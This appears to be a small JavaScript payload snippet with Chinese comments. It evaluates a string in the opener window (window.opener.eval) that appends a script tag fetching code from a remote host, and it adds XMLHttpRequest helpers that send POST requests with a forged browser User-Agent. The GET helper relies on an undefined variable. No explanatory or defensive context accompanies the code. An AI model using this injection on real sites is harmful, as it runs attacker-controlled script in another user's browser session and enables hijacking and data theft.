
// 动态向网页中添加元素
x="e=document.createElement('script');e.src='http://www.example.com';document.body.appendChild(e);";
window.opener.eval(x);

function _xhr() {
    return window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
}
// http请求
function _post(__url,__data,__sync){
    var xmlHttp = _xhr();
    xmlHttp.open("POST",__url,__sync);
    xmlHttp.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    xmlHttp.setRequestHeader("Content-Encoding","gzip");
    xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
    xmlHttp.setRequestHeader("User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.3");
    xmlHttp.send(__data);
}

//
function _get() {
    xmlHttp = _xhr();
    xmlHttp.open("GET",url,false);
    xmlHttp.send();
    result = xmlHttp.responseText;
    // do something with result
}